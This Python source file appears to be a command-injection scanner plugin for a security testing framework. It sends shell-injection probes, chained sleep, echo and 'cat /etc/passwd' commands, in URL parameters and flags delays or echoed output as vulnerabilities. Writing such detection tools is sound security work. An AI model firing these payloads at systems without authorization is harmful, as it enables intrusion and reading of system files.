from typing import Optional

from .base import BaseScanner
from .registry import register_scanner
from core.models import ScanTarget, Endpoint, Finding, ScannerManifest


CMDI_PAYLOADS = [
    ("sleep 3", "sleep", "time"),
    ("; sleep 3", "sleep", "time"),
    ("| sleep 3", "sleep", "time"),
    ("`sleep 3`", "sleep", "time"),
    ("$(sleep 3)", "sleep", "time"),
    ("|| sleep 3", "sleep", "time"),
    ("&& sleep 3", "sleep", "time"),
    ("; echo CMITEST", "CMITEST", "echo"),
    ("| echo CMITEST", "CMITEST", "echo"),
    ("`echo CMITEST`", "CMITEST", "echo"),
    ("$(echo CMITEST)", "CMITEST", "echo"),
    ("cat /etc/passwd", "root:", "file"),
    ("; cat /etc/passwd", "root:", "file"),
]


@register_scanner(manifest=ScannerManifest(
    name="cmdi_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=30,
    produces_tag_patterns=["cmdi", "rce"],
))
class CMDIScanner(BaseScanner):
    @property
    def name(self) -> str:
        return "cmdi_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list[Finding], list[Endpoint]]:
        findings: list[Finding] = []
        endpoints: list[Endpoint] = []

        for payload, indicator, technique in CMDI_PAYLOADS:
            try:
                resp = await self.request(
                    "GET", target.url,
                    params={"q": payload, "cmd": payload, "exec": payload},
                    timeout=10,
                )
                body = resp.text
                if technique == "time":
                    if resp.elapsed and resp.elapsed.total_seconds() >= 2.5:
                        findings.append(self.make_finding(
                            title="Command Injection — Time-based",
                            description=f"Payload '{payload}' caused {resp.elapsed.total_seconds():.1f}s delay.",
                            severity="critical",
                            endpoint=self.make_endpoint(target.url, discovered_by=self.name),
                            evidence={"payload": payload, "delay_seconds": resp.elapsed.total_seconds()},
                            confidence=0.7,
                            tags=["cmdi", "rce", "time-based"],
                        ))
                else:
                    if indicator.lower() in body.lower():
                        findings.append(self.make_finding(
                            title="Command Injection — Output-based",
                            description=f"Payload '{payload}' produced output containing '{indicator}'.",
                            severity="critical",
                            endpoint=self.make_endpoint(target.url, discovered_by=self.name),
                            evidence={"payload": payload, "indicator": indicator,
                                      "body_snippet": body[:200]},
                            confidence=0.9,
                            tags=["cmdi", "rce", "output-based"],
                        ))
            except Exception:
                pass

        return findings, endpoints
